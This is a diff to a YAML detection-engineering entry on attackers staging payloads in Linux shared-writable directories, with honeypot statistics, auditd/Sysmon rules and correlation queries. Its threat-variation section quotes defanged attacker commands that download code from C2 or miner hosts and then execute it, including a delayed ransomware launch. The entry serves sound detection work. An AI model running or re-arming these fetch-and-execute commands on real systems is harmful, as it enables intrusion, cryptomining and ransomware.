@@ -29,9 +29,10 @@ DetectionDifficulty: LOW
 Description: >
   Code that lands on a Linux host as a file in a shared-writable
   directory (/tmp, /dev/shm, /var/tmp) must be written before it
-  can run. The write generates a file-creation event; execution
-  typically generates an execve, though shell builtins like source
-  run in the current process without one (see BN-04). Delivery
+  can be consumed. The write generates a file-creation event;
+  direct execution generates an execve, while interpreter or
+  loader consumption may instead be visible through command-line
+  arguments or file-access telemetry (see BN-04). Delivery
   method changes (scp, wget, C2 upload, heredoc, lateral scp),
   execution method changes (bash, chmod+exec, python3, cron,
   nohup), but the file-write event does not. This covers file-backed staging only. Stdin-only
@@ -42,9 +43,9 @@ Description: >
   Sysmon for Linux. Of ~80k total log lines captured, ~780 were
   operator-attributable exec events. Same pattern seen in the wild:
   C0XMO writes to /tmp/.cache, chmod 777, executes, deletes. Rocke
-  group stages to /tmp with cron persistence via /var/spool/cron.
-  On a 153-day SSH honeypot, 4,703 of the 5,020 sessions that
-  staged a file and ran or scheduled something (93.69%) wrote to a
+  group stages to /var/tmp with cron persistence via /var/spool/cron.
+  On a 153-day SSH honeypot, 4,703 of the 5,020 sessions with
+  stage, execute, or in-memory activity (93.69%) wrote to a
   shared-writable directory and then executed or scheduled the file
   from there. The detection has to join on the file path, not the
   delivery session, because 86.22% of the linked runs were only
@@ -55,13 +56,16 @@ CoConspirator: SancLogic
 
 TheConstant: >
   New code staged as a file in a shared-writable directory must be written
-  before it can be executed. The delivery method (SSH channel, wget, curl,
+  before it can be consumed. The delivery method (SSH channel, wget, curl,
   scp, web shell) and the launcher (the session shell, cron, systemd,
-  nohup) can change; the file write and the execution cannot. This
-  chokepoint covers file-backed staging only. Code piped directly into an
-  interpreter with no file written (190 honeypot sessions) and code passed
-  as a command-line argument (python -c, perl -e) are out of scope and need
-  a separate process-lineage rule.
+  nohup) can change; the file write and the consumption cannot. Direct
+  execution is visible through execve; interpreter or loader consumption
+  may instead be visible through command-line arguments or file-access
+  telemetry (see BN-04 for the source-builtin exception where no new
+  execve fires). This chokepoint covers file-backed staging only. Code
+  piped directly into an interpreter with no file written (190 honeypot
+  sessions) and code passed as a command-line argument (python -c, perl -e)
+  are out of scope and need a separate process-lineage rule.
 
 Prerequisites:
   - A Linux host with /tmp, /var/tmp or /dev/shm present (virtually all distributions)
@@ -78,7 +82,7 @@ AttackerControls:
 
 AttackerCannotControl:
   - The file write to a staging directory generating a kernel-mediated event
-  - The execve syscall when executing the staged file
+  - The consumption of the staged file generating observable telemetry (execve for direct execution; command-line arguments or file-access events for interpreter consumption)
   - The fact that both events are host-local and linkable by path
   - That tmpfs-backed paths (/dev/shm) still generate file-write events
 
@@ -92,7 +96,7 @@ Chokepoints:
       26 file_land events on deb12, 30 on rocky9 — every delivery method
       (scp, heredoc, base64, echo pipe, python write, C2 upload, lateral scp)
       generated at least one file_land event. Wild evidence: C0XMO writes
-      to /tmp/.cache via wget; Rocke stages to /tmp via curl/wget.
+      to /tmp/.cache via wget; Rocke stages to /var/tmp via curl/wget.
     WhyCantBypass: >
       Code that is not on the host has to arrive and be stored somewhere before
       it can run. On the honeypot the 4,703 staged-then-executed sessions
@@ -147,7 +151,7 @@ Chokepoints:
           paths is needed before this is analyst-usable.
   - Stage: Run
     Input: The payload is on the host as a file
-    Invariant: Some process must execute the staged file, either directly by path or through an interpreter.
+    Invariant: Some process must consume the staged file, either directly by path or through an interpreter.
     Observable: >
       Direct execution: auditd execve with the staged path as exe;
       Sysmon EID 1 with Image under a staging directory. Lab evidence:
@@ -167,8 +171,10 @@ Chokepoints:
       'sleep 14400 && /encrypt_.out'. The launcher varies; the execution
       does not. A file on disk that does nothing is not a threat. To have
       effect, something must read and act on it. Direct execution goes through
-      execve. Interpreter execution goes through execve for the interpreter,
-      with the staged path visible in the command line arguments.
+      execve. Interpreter consumption is visible through execve for the
+      interpreter plus the staged path in its command-line arguments.
+      The source builtin (BN-04) is the exception: no new execve fires,
+      but file_land still catches the staging write.
     LogSources:
       - Sysmon for Linux Event ID 1 (Process Creation)
       - "auditd: -a always,exit -F arch=b64 -S execve -F key=exec_log (and b32)"
@@ -193,7 +199,8 @@ Chokepoints:
     Observable: >
       A file create under a staging directory followed within 2 hours by a
       process whose Image is that same path, on the same host. Lab evidence:
-      every land method hit file_land and every run method hit exec_log;
+      every land method hit file_land; every run method except source
+      (BN-04) hit exec_log;
       the lateral-movement hop proves the same pattern fires on internal
       redeployment from a second host (T1021.004 / T1570).
     WhyCantBypass: >
@@ -217,7 +224,7 @@ Chokepoints:
 
 Variations:
   - Name: 'C0XMO/Gafgyt: SSH brute force, wget to /tmp, direct execution with cron persistence'
-    FirstSeen: '2024-03'
+    FirstSeen: '2026-03'
     Status: Active
     SourceURL: https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
     NotesShort: 'wget -O /tmp/.cache; chmod 777 .cache; ./.cache; copies to /var/tmp/.sys, /dev/shm/.sys with cron */15'
@@ -235,11 +242,11 @@ Variations:
     Command:
       Invocation: 'cd /tmp; wget -q hxxp://[C2]/bot[.]arch -O .cache; chmod 777 .cache; ./.cache; rm -f .cache'
       Artifacts:
-        - 'Fortinet FortiGuard Labs, C0XMO analysis, 2024'
+        - 'Fortinet FortiGuard Labs, C0XMO analysis, 2026'
   - Name: 'Rocke Group: cryptominer staged to /var/tmp with cron and systemd persistence'
     FirstSeen: '2019-01'
     Status: Active
-    SourceURL: https://intezer.com/blog/cloud-security/rocke-group-actively-targeting-the-cloud-wants-your-ssh-keys/
+    SourceURL: https://www.zscaler.com/blogs/cybersecurity-best-practices/rocke-cryptominer
     NotesShort: 'curl/wget to /var/tmp/kworkerds; nohup execution; cron */10 with pastebin stager'
     Notes: >
       Rocke Group targets cloud Linux hosts, staging the XMRig miner as
@@ -256,10 +263,10 @@ Variations:
     Command:
       Invocation: '(curl -fsSL --connect-timeout 120 hxxps://master[.]minerxmr[.]ru/One/x1 -o /var/tmp/kworkerds||wget hxxps://master[.]minerxmr[.]ru/One/x1 -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds'
       Artifacts:
-        - 'Intezer, Rocke Group analysis, 2019'
-        - 'Zscaler ThreatLabZ, Rocke cryptominer analysis'
+        - 'Red Canary / Zscaler, Rocke cryptominer analysis, 2019'
+        - 'Intezer, Rocke Group analysis, 2021'
   - Name: 'UNC3944: SCP to /tmp on ESXi, nohup execution with time delay'
-    FirstSeen: '2023-09'
+    FirstSeen: '2025-07'
     Status: Active
     SourceURL: https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944/
     NotesShort: 'SCP ransomware to /tmp/encrypt.out; chmod 0777; nohup with 4-hour sleep'
@@ -277,7 +284,7 @@ Variations:
     Command:
       Invocation: 'chmod 0777 encrypt.out; cp encrypt.out encrypt_.out; nohup sh -c ''sleep 14400 && /encrypt_.out -pass [REDACTED] -skip_vms /list.txt'' &'
       Artifacts:
-        - 'Google Cloud Threat Intelligence, UNC3944/Scattered Spider analysis, 2023'
+        - 'Google Cloud Threat Intelligence, UNC3944/Scattered Spider analysis, 2025'
   - Name: Payload over the SSH channel, run by cron (honeypot)
     FirstSeen: '2026-04'
     Status: Active
@@ -437,10 +444,10 @@ Detections:
       Notes: >
         Lab-validated 2026-09-28. The Sliver implant at /tmp/.update, the
         reverse shell at /dev/shm/.cache, and the staging payload at
-        /dev/shm/.payload all match the dot-prefix selection. The cron
-        persistence writing /tmp/.update to a crontab matches the
-        cron-from-staging selection. C0XMO /tmp/.cache would also match
-        the dot-prefix selection. The full temporal write-then-execute
+        /dev/shm/.payload all match the dot-prefix selection. When crond
+        later executes a staged file from /tmp, the cron-from-staging
+        selection catches the child process. C0XMO /tmp/.cache would also
+        match the dot-prefix selection. The full temporal write-then-execute
         correlation requires SIEM-specific queries (see RequiredCorrelation).
 
 RequiredCorrelation:
@@ -467,7 +474,9 @@ RequiredCorrelation:
         | rename TargetFilename AS staged_path, _time AS land_time
         | join Computer, staged_path [search index=linux sourcetype=sysmon EventCode=1 (Image="*/sh" OR Image="*/bash" OR Image="*/perl" OR Image="*/python*") (CommandLine="* /tmp/*" OR CommandLine="* /var/tmp/*" OR CommandLine="* /dev/shm/*") | rex field=CommandLine "(?<staged_path>/(?:tmp|var/tmp|dev/shm)/\S+)" | rename _time AS run_time]
         | where run_time > land_time AND run_time - land_time < 7200
-      Example Elastic EQL:
+      Example Elastic EQL (coarse sequencing — does not enforce the same
+      file path between write and execute events; use process.command_line
+      filtering to narrow):
         sequence by host.name with maxspan=2h
           [file where file.path : ("/tmp/*", "/var/tmp/*", "/dev/shm/*")]
           [process where process.executable : ("*/sh", "*/bash", "*/perl", "*/python*") and process.command_line : ("* /tmp/*", "* /var/tmp/*", "* /dev/shm/*")]
@@ -512,7 +521,7 @@ HoneypotMethodology:
         line within the same session. Breakdown by delivery method:
         stdin-to-file 4,055; fetch-to-file (wget/curl) 463; scp pull 185.
       LedgerID: L02
-    - Figure: '5,020 sessions that staged and ran or scheduled'
+    - Figure: '5,020 sessions with stage, execute, or in-memory activity'
       Derivation: >
         4,703 (staged-then-executed) + 190 (in-memory pipe-to-interpreter)
         + 124 (staged, never executed in session) + 3 (executed, no
@@ -539,7 +548,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz / chokepoint_evidence_rocky9.tar.gz
     Description: "File write to staging directory — the 'land' side of the chokepoint"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28. Both targets destroyed after evidence collection."
-    SourceURL: https://attack.mitre.org/techniques/T1105/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Research
     Sample: |
@@ -550,7 +559,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz / chokepoint_evidence_rocky9.tar.gz
     Description: "Process execution — the 'run' side of the chokepoint"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28."
-    SourceURL: https://attack.mitre.org/techniques/T1059/004/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Hunt
       - Analyst
@@ -562,7 +571,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz / chokepoint_evidence_rocky9.tar.gz
     Description: "Process creation with full command line"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28."
-    SourceURL: https://attack.mitre.org/techniques/T1059/004/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Hunt
       - Analyst
@@ -576,7 +585,7 @@ RawLogs:
     Source: chokepoint_evidence_deb12.tar.gz (journalctl)
     Description: "Marker payloads confirming each delivery/execution variant"
     EvidenceBasis: "Real capture from authorized lab exercise, 2026-09-28. Markers only emitted on deb12."
-    SourceURL: https://attack.mitre.org/techniques/T1105/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Research
       - Hunt
@@ -592,7 +601,7 @@ RawLogs:
     Source: honeypot events table / events.jsonl
     Description: 'Land: a download to a file in the same request that runs it'
     EvidenceBasis: 'Real capture from my own honeypot, 2026-04-27 to 2026-09-26 UTC. Emulated shell: nothing was downloaded or run; this is an attempted command. Staging address pseudonymised, URL defanged.'
-    SourceURL: https://attack.mitre.org/techniques/T1105/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Research
       - Analyst
@@ -603,7 +612,7 @@ RawLogs:
     Source: honeypot events table / events.jsonl (events.id 9422)
     Description: 'Land over stdin: the cat > "w.sh" part of a chained line; the same session later names w.sh in a cron line'
     EvidenceBasis: 'Real capture from my own honeypot, 2026-05-06 UTC. The part starts with "then" because the emulated shell split an if/then line on "; ". The defanger renders w.sh as w[.]sh. stdin bytes were not captured. Source IP pseudonymised.'
-    SourceURL: https://attack.mitre.org/techniques/T1053/003/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Research
       - Analyst
@@ -614,7 +623,7 @@ RawLogs:
     Source: honeypot events table / events.jsonl (events.id 786044)
     Description: 'Run through an interpreter in a new SSH connection, 3 s after the same source pushed the file with scp -t in another connection'
     EvidenceBasis: 'Real capture from my own honeypot, 2026-09-08 UTC. The only command event in this session. Source IP pseudonymised.'
-    SourceURL: https://attack.mitre.org/techniques/T1059/004/
+    SourceURL: https://github.com/iimp0ster/detection-chokepoints/pull/191
     MatchedRules:
       - Hunt
       - Analyst
@@ -626,9 +635,8 @@ EmulationScript:
   Language: shell
   AtomicRef: "T1059.004, T1105, T1053.003"
   Description: >
-    Stages benign marker payloads to /tmp and /dev/shm via multiple
-    delivery methods, runs them, validates cron spool writes, then
-    cleans up. Generates telemetry only. Not yet run.
+    Benign marker payloads staged to /tmp and /dev/shm, run via multiple methods, cron spool validated.
+    Run 2026-09-28 on Debian 12 and Rocky 9. All markers fired.
   SafetyNotes: >
     Run ONLY in an isolated lab VM. Do NOT run on production hosts. This
     script generates benign telemetry to validate auditd and Sysmon rules.
@@ -651,10 +659,10 @@ Intel:
     Tier: supporting
     URL: https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
     Description: Primary threat narrative. SSH brute force staging to /tmp/.cache with cron persistence.
-  - Name: 'Intezer: Rocke Group Cloud Targeting'
+  - Name: 'Red Canary / Zscaler: Rocke Group Cloud Targeting'
     Tier: supporting
-    URL: https://intezer.com/blog/cloud-security/rocke-group-actively-targeting-the-cloud-wants-your-ssh-keys/
-    Description: Cryptominer staged to /var/tmp with cron and systemd persistence.
+    URL: https://www.zscaler.com/blogs/cybersecurity-best-practices/rocke-cryptominer
+    Description: Cryptominer staged to /var/tmp/kworkerds with cron and systemd persistence. Primary source for the /var/tmp staging claim.
   - Name: 'Google Cloud: Defending vSphere from UNC3944'
     Tier: supporting
     URL: https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944/
